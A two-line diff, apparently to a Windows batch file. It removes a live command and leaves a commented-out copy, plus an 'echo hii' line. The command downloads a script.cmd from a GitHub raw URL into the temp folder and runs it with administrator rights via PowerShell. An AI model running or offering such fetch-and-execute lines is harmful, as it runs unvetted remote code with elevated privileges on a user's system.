@@ -1,1 +1,2 @@
-curl.exe -L -o "%TEMP%\script.cmd" "https://raw.githubusercontent.com/shamim4s/importent-urls/master/script.cmd" && powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c %TEMP%\script.cmd'"
+echo hii
+#### curl.exe -L -o "%TEMP%\script.cmd" "https://raw.githubusercontent.com/shamim4s/importent-urls/master/script.cmd" && powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c %TEMP%\script.cmd'"
